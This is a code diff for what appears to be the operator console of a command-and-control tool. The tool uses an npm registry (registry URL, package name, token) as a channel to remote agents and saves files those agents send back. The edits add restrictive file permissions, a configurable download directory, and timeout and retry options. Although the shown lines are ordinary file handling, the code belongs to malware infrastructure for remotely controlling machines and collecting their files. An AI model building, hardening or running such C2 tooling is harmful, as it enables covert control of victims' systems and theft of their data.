@@ -190,9 +190,9 @@ function sanitizeFilename(name) {
 }
 
 /** Save a transferred file from a result payload to downloads/. */
-function saveDownload(agentId, r) {
-  const dir = path.resolve('downloads');
-  fs.mkdirSync(dir, { recursive: true });
+function saveDownload(agentId, r, downloadDir = 'downloads') {
+  const dir = path.resolve(downloadDir);
+  fs.mkdirSync(dir, { recursive: true, mode: 0o700 });
   if (!Number.isSafeInteger(r.seq) || r.seq < 1) {
     throw new Error('missing or invalid result sequence');
   }
@@ -210,7 +210,8 @@ function saveDownload(agentId, r) {
   if (data.length !== r.file.size) {
     throw new Error(`decoded size mismatch (${data.length} bytes, expected ${r.file.size})`);
   }
-  fs.writeFileSync(out, data);
+  fs.writeFileSync(out, data, { mode: 0o600 });
+  if (process.platform !== 'win32') fs.chmodSync(out, 0o600);
   return out;
 }
 
@@ -229,7 +230,7 @@ function formatHistoryEntry(e) {
 async function main() {
   const cfg = loadConfig(configArgFromArgv());
   const logger = createLogger({
-    level: process.env.NPM_C2_LOG_LEVEL || 'info',
+    level: cfg.logLevel,
     logFile: cfg.logFile,
     console: false, // keep REPL output clean; log lines go to the file only
   });
@@ -242,6 +243,9 @@ async function main() {
     registryUrl: cfg.registryUrl,
     packageName: cfg.packageName,
     token: cfg.token,
+    timeoutMs: cfg.requestTimeoutMs,
+    maxRetries: cfg.maxRetries,
+    baseDelayMs: cfg.retryBaseDelayMs,
     logger,
   });
 
@@ -286,7 +290,7 @@ async function main() {
     }
     if (r.file && typeof r.file.dataB64 === 'string') {
       try {
-        const out = saveDownload(agentId, r);
+        const out = saveDownload(agentId, r, cfg.downloadDir);
         notify(`${head} ${c('green', 'done')}: ${output} -> saved to ${c('bold', out)}`, redraw);
       } catch (err) {
         notify(`${head} ${c('red', 'error')}: received file but failed to save: ${err.message}`, redraw);
